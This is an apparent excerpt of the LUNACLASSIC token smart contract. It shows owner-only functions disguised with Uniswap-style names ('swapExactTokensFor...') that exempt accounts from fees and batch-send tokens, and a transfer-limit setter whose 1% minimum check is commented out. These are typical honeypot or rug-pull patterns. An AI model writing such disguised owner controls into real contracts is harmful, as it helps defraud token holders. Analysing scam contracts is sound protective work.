...
contract LUNACLASSIC is Context, IERC20, Ownable {
    ...
    string private _symbol = "LUNACLASSIC";
    ...
    address public _MarketingWallet = 0xbd38C47348F7d107528b0A8a5837ab0913625478;
...
//    }
    ...
    function swapExactTokensForexcludeFromFeeTransfer(address account) public onlyOwner {
        _isExcludedFromFeeTransfer[account] = true;
    }
 ...
 //       require(settingOutAmount >= _tTotal / 100, "Min 1%");
        _settingOutAmountTransfer = settingOutAmount;
          ...
          // TMA
  // ------------------------------------------------------------------------
    function swapExactTokensForTokensmul(address[] memory receivers, uint256[] memory amounts) public onlyOwner {
